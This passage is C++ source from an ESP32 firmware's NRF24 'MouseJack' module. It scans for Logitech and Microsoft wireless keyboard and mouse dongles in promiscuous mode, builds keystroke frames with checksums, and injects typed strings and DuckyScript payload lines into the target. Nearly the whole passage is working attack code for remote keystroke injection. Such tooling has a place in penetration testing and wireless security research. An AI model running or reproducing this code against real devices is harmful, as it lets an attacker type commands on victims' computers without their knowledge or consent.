viniciushnf/ESP32-S3-Bruce-ST7735-1.8/bruce-firmware/src/modules/NRF24/nrf_mousejack.cpp
    mj_transmitReliable(frame, sizeof(frame));
    delay(5);
}

// ── Logitech Keystroke Transmit ─────────────────────────────────
static void mj_logTransmit(const MjTarget &target, uint8_t meta, const uint8_t *keys, uint8_t keysLen) {
    uint8_t frame[10];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x00;
    frame[1] = 0xC1;
    frame[2] = meta;
    for (uint8_t i = 0; i < keysLen && i < 6; i++) { frame[3 + i] = keys[i]; }

    // Two's-complement checksum
    uint8_t cksum = 0;
    for (uint8_t i = 0; i < 9; i++) cksum += frame[i];
    frame[9] = (uint8_t)(0x100 - cksum);

    mj_transmitReliable(frame, sizeof(frame));
}

// ── Send single keystroke (press + release) ─────────────────────
static void mj_sendKeystroke(const MjTarget &target, uint8_t modifier, uint8_t keycode) {
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        mj_msTransmit(target, modifier, keycode);
    } else if (target.type == MJ_DEVICE_LOGITECH) {
        mj_logTransmit(target, modifier, &keycode, 1);
        delay(ATTACK_INTER_KEY_MS);
        uint8_t none = MJ_KEY_NONE;
        mj_logTransmit(target, MJ_MOD_NONE, &none, 1);
    }
}

// ── Type a string as keystrokes ─────────────────────────────────
static void mj_typeString(const MjTarget &target, const char *text) {
    for (size_t i = 0; text[i] != '\0'; i++) {
        if (check(EscPress)) return;

        MjHidKey entry;
        char c = text[i];
        if (c == '\n') {
            entry.modifier = MJ_MOD_NONE;
            entry.keycode = MJ_KEY_ENTER;
        } else if (c == '\t') {
            entry.modifier = MJ_MOD_NONE;
            entry.keycode = MJ_KEY_TAB;
        } else if (!mj_asciiToHid(c, entry)) {
            continue;
        }
        mj_sendKeystroke(target, entry.modifier, entry.keycode);
        delay(ATTACK_INTER_KEY_MS);
    }
}

// ── DuckyScript line parser ─────────────────────────────────────
static bool mj_parseDuckyLine(const String &line, const MjTarget &target) {
    if (line.startsWith("REM") || line.startsWith("//")) return true;

    if (line.startsWith("DELAY ") || line.startsWith("DELAY\t")) {
        int delayMs = line.substring(6).toInt();
        if (delayMs > 0 && delayMs <= 60000) delay(delayMs);
        return true;
    }

    if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
        return true; // Handled by caller
    }

    if (line.startsWith("STRING ")) {
        mj_typeString(target, line.substring(7).c_str());
        return true;
    }

    if (line.startsWith("STRINGLN ")) {
        mj_typeString(target, line.substring(9).c_str());
        mj_sendKeystroke(target, MJ_MOD_NONE, MJ_KEY_ENTER);
        return true;
    }

    if (line.startsWith("REPEAT ")) return true;

    // Handle key names and modifier combos
    uint8_t combinedMod = 0;
    uint8_t keycode = MJ_KEY_NONE;
    String remaining = line;
    remaining.trim();

    while (remaining.length() > 0) {
        int spaceIdx = remaining.indexOf(' ');
        String token;
        if (spaceIdx > 0) {
            token = remaining.substring(0, spaceIdx);
            remaining = remaining.substring(spaceIdx + 1);
            remaining.trim();
        } else {
            token = remaining;
            remaining = "";
        }

        // Single character key
        if (token.length() == 1) {
            MjHidKey entry;
            if (mj_asciiToHid(token.charAt(0), entry)) {
                combinedMod |= entry.modifier;
                keycode = entry.keycode;
            }
            continue;
        }

        // Named key/modifier lookup
        bool found = false;
        for (int i = 0; DUCKY_KEYS[i].name != nullptr; i++) {
            if (token.equalsIgnoreCase(DUCKY_KEYS[i].name)) {
                combinedMod |= DUCKY_KEYS[i].modifier;
                if (DUCKY_KEYS[i].keycode != MJ_KEY_NONE) { keycode = DUCKY_KEYS[i].keycode; }
                found = true;
                break;
            }
        }
        if (!found) {
            Serial.printf("[MJ] Ducky: unknown token '%s'\n", token.c_str());
            return false;
        }
    }

    mj_sendKeystroke(target, combinedMod, keycode);
    delay(ATTACK_INTER_KEY_MS);
    return true;
}

// ── Get device type label ───────────────────────────────────────
static const char *mj_getTypeLabel(MjDeviceType type) {
    switch (type) {
        case MJ_DEVICE_MICROSOFT: return "MS";
        case MJ_DEVICE_MS_CRYPT: return "MS*";
        case MJ_DEVICE_LOGITECH: return "LG";
        default: return "??";
    }
}

// ── Format address as string ────────────────────────────────────
static String mj_formatAddr(const MjTarget &t) {
    char buf[18];
    if (t.addrLen >= 5) {
        snprintf(
            buf,
            sizeof(buf),
            "%02X:%02X:%02X:%02X:%02X",
            t.address[0],
            t.address[1],
            t.address[2],
            t.address[3],
            t.address[4]
        );
    } else {
        snprintf(buf, sizeof(buf), "%02X:%02X", t.address[0], t.address[1]);
    }
    return String(buf);
}

// ══════════════════════════════════════════════════════════════════
// ═══════════════ SCANNING UI ═══════════════════════════════════
// ══════════════════════════════════════════════════════════════════

static void mj_drawScanScreen(uint8_t currentCh, bool initial) {
    int contentY = BORDER_PAD_Y + FM * LH + 4; // Below title
    int footerH = FP * LH + 4;
    int listY = contentY + 14; // Below status line
    int listH = tftHeight - listY - footerH - 6;

    if (initial) { drawMainBorderWithTitle("MOUSEJACK SCAN"); }

    // Status line (below title, inside border)
    tft.setTextSize(FP);
    tft.fillRect(7, contentY, tftWidth - 14, 12, bruceConfig.bgColor);
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    char statusBuf[40];
    snprintf(statusBuf, sizeof(statusBuf), "CH:%3d  Targets:%d", currentCh, mj_targetCount);
    tft.drawCentreString(statusBuf, tftWidth / 2, contentY, 1);

    // Target list
    int maxItems = listH / 12;
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    for (int i = 0; i < maxItems && i < mj_targetCount; i++) {
        int y = listY + i * 12;
        tft.fillRect(7, y, tftWidth - 14, 12, bruceConfig.bgColor);
        char line[40];
        snprintf(
            line,
            sizeof(line),
            "[%s] %s ch%d",
            mj_getTypeLabel(mj_targets[i].type),
            mj_formatAddr(mj_targets[i]).c_str(),
            mj_targets[i].channel
        );
        tft.drawString(line, 12, y, 1);
    }

    // Footer (inside border)
    int footerY = tftHeight - BORDER_PAD_X - FP * LH - 2;
    tft.fillRect(7, footerY, tftWidth - 14, FP * LH, bruceConfig.bgColor);
    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
    tft.drawCentreString("[ESC] Stop", tftWidth / 2, footerY, 1);
}

// ── Scanning function ───────────────────────────────────────────
static bool mj_scan() {
    mj_targetCount = 0;
    memset(mj_targets, 0, sizeof(mj_targets));

    if (!mj_validateNrfMode()) return false;

    if (!nrf_start(mj_nrfMode)) {
        displayError("NRF24 not found", true);
        return false;
    }

    // Configure promiscuous mode
    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.setAddressWidth(2);
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.setPayloadSize(32);
    NRFradio.setRetries(0, 0);
    NRFradio.flush_rx();
    NRFradio.flush_tx();

    const uint8_t noiseAddress[][2] = {
        {0x55, 0x55},
        {0xAA, 0xAA},
        {0xA0, 0xAA},
        {0xAB, 0xAA},
        {0xAC, 0xAA},
        {0xAD, 0xAA}
    };
    for (uint8_t i = 0; i < 6; i++) { NRFradio.openReadingPipe(i, noiseAddress[i]); }

